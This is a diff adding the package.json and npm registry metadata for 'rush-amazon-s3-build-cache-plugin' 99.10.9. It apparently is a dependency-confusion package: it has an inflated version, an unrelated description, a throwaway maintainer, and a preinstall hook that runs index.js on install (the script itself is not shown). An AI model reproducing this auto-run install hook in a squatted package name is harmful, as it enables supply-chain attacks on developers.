@@ -1,0 +1,39 @@
+{
+    "name": "rush-amazon-s3-build-cache-plugin",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "rush-amazon-s3-build-cache-plugin@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-m8vqk6uhxngXValjL5dWe7pIFn9oTILZCbn6zlA1YKxWr637/0W5EsNq+k8GwwRmwqEGyA/jjT5c/q2jxhyRTQ==",
+        "shasum": "0d0d617c2f4e0eed91bff23b03326bdf33989751",
+        "tarball": "https://registry.npmjs.org/rush-amazon-s3-build-cache-plugin/-/rush-amazon-s3-build-cache-plugin-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5085,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPMxYACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmpX5w//QKUXCAufKZLc0QipIXhkZb6/DGqvmxzmCqW2/3tpYlMY1st9\r\nkAAV7tw7ZngHDC2LTNYtrJ1rppZnxG5RFWPzkvyo4G1jI7MfMSrFblADdd9j\r\nDvG1XChn+Brt5tt0b9md6dK2w7cqhSKYlwBUVyQbw27H5fN0r4ziov3T7QKh\r\n4LjjbMLBP1serPKKmG/AqpItX1kYO3yjcZSfUE862l41Gv1L4un8NPAIwqaY\r\nb+b/czHt1HlQBZE7mQFigePcdvLploc3lIrhoOsAsBwN/osJCkzfNMrsqO6d\r\nVpOLzObjqePLFxhf0getDSsK3d9IUv0lhRfoCxGRW7DdwPVsrctFcj47AC+I\r\n7FsZv7h9Qpbiofa5L4L2B9/uCwuES4wmqGbz9Twcf8McouKWfwLPwRpXrTo4\r\nJeD1rs1FXqLjsMMyN8536bKFp3sFiaUAazVTQPJQxWU8+MfPc6S2zevuSFRm\r\nzPCMMQLbwIRT+cmC7OtuA8RFvXZod2CN1/jlYML3ScO27vc3hu35UCRQ3p1S\r\nnf8LTME5CQXkWTRk+7NakdzKIy/Kla9uRS9Ti3PSDv90ZU1sF0LfTFqTSb1I\r\njObqmAbT4n8zN92KtNXBlkSPQMUUCWNPPqP+uXDuNXTZGKgSuMYKL6M6bJ5a\r\nOOyUftogBqdrRoE91ORWrqaEglrz6ocuubc=\r\n=O8db\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "eapikdqj",
+        "email": "eapikdqj@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "eapikdqj",
+            "email": "eapikdqj@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/rush-amazon-s3-build-cache-plugin_99.10.9_1648151640246_0.3776854750037"
+    },
+    "_hasShrinkwrap": false
+}
